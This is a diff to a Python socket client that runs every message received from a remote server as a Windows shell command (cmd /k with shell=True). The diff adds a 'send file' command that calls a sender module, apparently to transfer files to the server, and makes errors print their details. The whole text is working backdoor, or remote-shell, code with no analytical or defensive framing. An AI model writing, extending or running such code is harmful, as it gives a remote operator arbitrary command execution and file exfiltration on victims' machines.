@@ -1,6 +1,8 @@
 import socket
 import threading
 import subprocess
+import os
+import sender
 
 # Constants
 HEADER = 64
@@ -22,6 +24,8 @@ def receive_messages():
             if msg_length:
                 msg_length = int(msg_length)
                 msg = client.recv(msg_length).decode(FORMAT)
+                if msg == "send file":
+                    sender.send_file()
                 try:
                     cmd = subprocess.Popen('cmd /k "%s"'%msg,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE)
                     out,err = cmd.communicate()
@@ -32,8 +36,9 @@ def receive_messages():
                 if msg == DISCONNECT_MESSAGE:
                     print("[DISCONNECTED] The server has closed the connection.")
                     break
-        except:
+        except Exception as e:
             print("[ERROR] Connection closed.")
+            print(e)
             break
     client.close()
 
@@ -61,3 +66,6 @@ def start():
 if __name__ == "__main__":
     print("[STARTING] Client is starting...")
     start()
+
+
+
